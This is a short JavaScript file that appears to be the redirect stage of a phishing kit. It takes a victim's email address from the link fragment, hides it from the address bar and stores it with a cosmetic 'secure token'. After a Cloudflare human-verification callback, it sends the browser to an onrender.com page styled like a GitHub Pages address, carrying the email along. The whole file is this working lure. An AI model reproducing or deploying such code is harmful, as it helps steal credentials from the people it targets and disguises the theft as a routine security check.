function generateSecureToken(length = 64) {
  const array = new Uint8Array(length / 2);
  window.crypto.getRandomValues(array);
  return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
}

window.onload = function () {
  const hash = window.location.hash.substring(1);
  if (hash && hash.includes("@")) {
    sessionStorage.setItem("redirect_email", hash);
    sessionStorage.setItem("redirect_token", generateSecureToken());
    history.replaceState(null, "", window.location.pathname);
  }
};

function onVerify(token) {
  // Cloudflare verification passed
  document.getElementById('continueBtn').style.display = 'inline-block';
  
  // Auto-submit after short delay (optional)
  setTimeout(() => {
    proceedWithRedirect();
  }, 1000);
}

// Attach click handler to button
document.addEventListener('DOMContentLoaded', function() {
  document.getElementById('continueBtn').addEventListener('click', proceedWithRedirect);
});

function proceedWithRedirect() {
  const email = sessionStorage.getItem("redirect_email");
  const token = sessionStorage.getItem("redirect_token");

  if (email && token) {
    const url = `https://ronnicf-github-io.onrender.com/adb.html#${email}&token=${token}`;
    window.location.href = url;
  } else {
    alert("Session expired or invalid. Please reload the page.");
  }
}
